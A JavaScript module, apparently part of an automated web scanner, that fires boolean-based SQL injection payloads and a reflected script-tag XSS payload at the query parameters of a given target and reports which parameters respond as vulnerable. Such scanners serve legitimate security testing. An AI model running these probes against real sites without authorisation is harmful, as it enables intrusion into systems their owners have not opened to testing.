const axios = require("axios");

// ----------------------
// EXTRACT PARAMS
// ----------------------
const extractParams = (url) => {
    try {
        const u = new URL(url);
        return [...u.searchParams.entries()].map(([key, value]) => ({ key, value }));
    } catch {
        return [];
    }
};

// ----------------------
// SQLi ATTACK (FAST)
// ----------------------
const runSQLi = async (target, links = []) => {

    const payloadPair = {
        truePayload: "' OR 1=1 --",
        falsePayload: "' AND 1=2 --"
    };

    let paths = links.filter(l => l.includes("?"));
    paths = [...new Set(paths)].slice(0, 1); // 🔥 limit

    if (paths.length === 0) {
        paths = [`http://${target}/?id=1`];
    }

    for (let path of paths) {

        const baseUrl = path.startsWith("http")
            ? path
            : `http://${target}${path.startsWith("/") ? "" : "/"}${path}`;

        console.log("BASE URL:", baseUrl);

        const params = extractParams(baseUrl);
        if (!params.length) continue;

        const requests = params.map(param => {

            const trueUrl = new URL(baseUrl);
            const falseUrl = new URL(baseUrl);

            trueUrl.searchParams.set(param.key, param.value + payloadPair.truePayload);
            falseUrl.searchParams.set(param.key, param.value + payloadPair.falsePayload);

            console.log("🧪 TRUE:", trueUrl.toString());
            console.log("🧪 FALSE:", falseUrl.toString());

            return Promise.all([
                axios.get(trueUrl.toString(), { timeout: 3000, validateStatus: () => true }),
                axios.get(falseUrl.toString(), { timeout: 3000, validateStatus: () => true })
            ])
            .then(([trueRes, falseRes]) => {
                if (trueRes.data.toString() !== falseRes.data.toString()) {
                    return {
                        type: "sqli",
                        vulnerable: true,
                        technique: "boolean-based",
                        payload: payloadPair.truePayload,
                        param: param.key,
                        target
                    };
                }
                return null;
            })
            .catch(() => null);
        });

        const results = await Promise.all(requests);
        const found = results.find(r => r);

        if (found) return found;
    }

    return { type: "sqli", vulnerable: false, target };
};

// ----------------------
// XSS ATTACK (FAST)
// ----------------------
const runXSS = async (target, links = []) => {

    const payload = "<script>alert(1)</script>";

    let paths = links.filter(l => l.includes("?"));
    paths = [...new Set(paths)].slice(0, 1); // 🔥 limit

    if (!paths.length) {
        return { type: "xss", vulnerable: false, target };
    }

    for (let path of paths) {

        const baseUrl = path.startsWith("http")
            ? path
            : `http://${target}${path.startsWith("/") ? "" : "/"}${path}`;

        console.log("🌐 XSS BASE:", baseUrl);

        const params = extractParams(baseUrl).slice(0, 1); // 🔥 limit param

        const requests = params.map(param => {

            const testUrl = new URL(baseUrl);
            testUrl.searchParams.set(param.key, payload);

            console.log(`🧪 XSS Testing [${param.key}]:`, testUrl.toString());

            return axios.get(testUrl.toString(), {
                timeout: 3000,
                validateStatus: () => true
            })
            .then(res => {
                const body = res.data.toString().toLowerCase();

                if (body.includes(payload.toLowerCase())) {
                    return {
                        type: "xss",
                        vulnerable: true,
                        payload,
                        param: param.key,
                        target
                    };
                }

                return null;
            })
            .catch(() => null);
        });

        const results = await Promise.all(requests);
        const found = results.find(r => r);

        if (found) return found;
    }

    return { type: "xss", vulnerable: false, target };
};

// ----------------------
// MAIN EXECUTOR
// ----------------------
const executeAttacks = async (actions, target, links = []) => {

    const promises = [];

    for (let act of actions) {
        if (act.type === "sqli") promises.push(runSQLi(target, links));
        if (act.type === "xss") promises.push(runXSS(target, links));
    }

    return Promise.all(promises);
};

module.exports = executeAttacks;